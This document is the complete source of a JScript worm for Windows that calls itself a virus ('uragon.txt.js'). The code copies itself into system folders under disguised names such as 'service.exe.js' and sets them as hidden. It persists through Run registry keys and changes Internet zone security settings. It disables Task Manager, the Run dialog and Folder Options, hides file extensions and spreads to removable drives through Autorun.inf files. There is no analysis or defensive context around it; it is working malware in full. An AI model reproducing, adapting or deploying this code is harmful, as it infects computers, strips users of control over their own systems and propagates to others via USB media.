iset="Internet Settings"; expl="Explorer"; virus="uragon.txt.js"; flag=0;
reg1="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\"; rdw="REG_DWORD"; rsz="REG_SZ";
fso=new ActiveXObject("Scripting.FileSystemObject"); wsh=new ActiveXObject("WScript.Shell");
try{wsh.run(WScript.arguments(0),1,false);}catch(e0){} 
try{value=wsh.regRead("HKLM\\SOFTWARE\\BICOLANOINI\\");if(value=="NHED57")WScript.quit();}catch(e1){}
wsh.regWrite("HKCU\\Software\\Microsoft\\Windows Script Host\\Settings\\Timeout",0,"REG_DWORD");
io=fso.openTextFile(WScript.ScriptFullName);cntnt=io.readAll();io.close(); for(;;){_();WScript.sleep(100);}
function _(){
	try {
		win=fso.getSpecialFolder(0)+"\\service.exe.js"; win32=fso.getSpecialFolder(0)+"\\system32\\winx86.dll.js";
		if(!fso.fileExists(win)){
			io=fso.createTextFile(win);io.write(cntnt);io.close();fso.getFile(win).attributes=7;
			try{lock=fso.openTextFile(win);for(;;)lock.readAll();}catch(e3){}
		}
		if(!fso.fileExists(win32)){
			io=fso.createTextFile(win32);io.write(cntnt);io.close();fso.getFile(win32).attributes=7;
			try{lock=fso.openTextFile(win32);for(;;)lock.readAll();}catch(e4){}
		}
		wsh.regWrite(reg1+iset+"\\Zones\\0\\1201",flag,rdw);wsh.regWrite(reg1+iset+"\\Zones\\1\\1201",flag,rdw);
		wsh.regWrite(reg1+iset+"\\Zones\\2\\1201",flag,rdw);wsh.regWrite(reg1+iset+"\\Zones\\3\\1201",flag,rdw);
		wsh.regWrite(reg1+iset+"\\Zones\\4\\1201",flag,rdw);
		wsh.regWrite(reg1+"Policies\\Explorer\\Run\\1","c:\\windows\\system32\\winx86.dll.js",rsz);
		wsh.regWrite(reg1+"Run\\updater23","c:\\windows\\service.exe.js",rsz);
		wsh.regWrite(reg1+"Policies\\"+expl+"\\NoRun",1,rdw);wsh.regWrite(reg1+"Policies\\"+expl+"\\NoFolderOptions",1,rdw);
		wsh.regWrite(reg1+"Policies\\"+expl+"\\NoShellSearchButton",1,rdw);wsh.regWrite(reg1+"Policies\\System\\DisableTaskmgr",1,rdw);
		wsh.regWrite(reg1+expl+"\\Advanced\\Hidden",2,rdw);wsh.regWrite(reg1+expl+"\\Advanced\\HideFileExt",1,rdw);
		wsh.regWrite(reg1+expl+"\\Advanced\\ShowSuperHidden",0,rdw);
		for(e=new Enumerator(fso.drives);!e.atEnd();e.moveNext()){
			dr=e.item(); 
			if((dr.driveType==1||dr.driveType==2)&&dr.driveLetter.substring(0,1).toUpperCase()!="A"){
				sze=dr.totalSize/(1024*1024*1024);
				if(sze<10/*10*/){
					p=dr.path+"\\";ssl=p+virus;ar=p+"Autorun.inf";
					inf="[autorun]\r\n" + "shellexecute=wscript.exe "+virus+" \"%1\"\r\nshell\\E&xplore\\command=wscript.exe "+virus+" \"%1\"\r\n"+
							"shell\\verb=&Open\r\nshell\\verb\\command=wscript.exe "+virus+" \"%1\"\r\n";
					if(!fso.fileExists(ssl))
						{io=fso.createTextFile(ssl);io.write(cntnt);io.close();fso.getFile(ssl).attributes=7;}
					if(fso.fileExists(ar)){
						f=fso.getFile(ar);io=f.openAsTextStream(1,-2);info=""; 
						if(!io.atEndOfStream)info=io.readAll();io.close();
						if(info.indexOf(inf)<0){f.attributes=0;io=f.openAsTextStream(2,-1);io.write(inf);io.close();}
					}else{io=fso.createTextFile(ar);io.write(inf);io.close();}
					fso.getFile(ar).attributes=6;
				}
			} 	 
		}
		try{io=fso.openTextFile(WScript.ScriptFullName);for(;;)io.readAll();}catch(e5){}
	}catch(e2){}
}

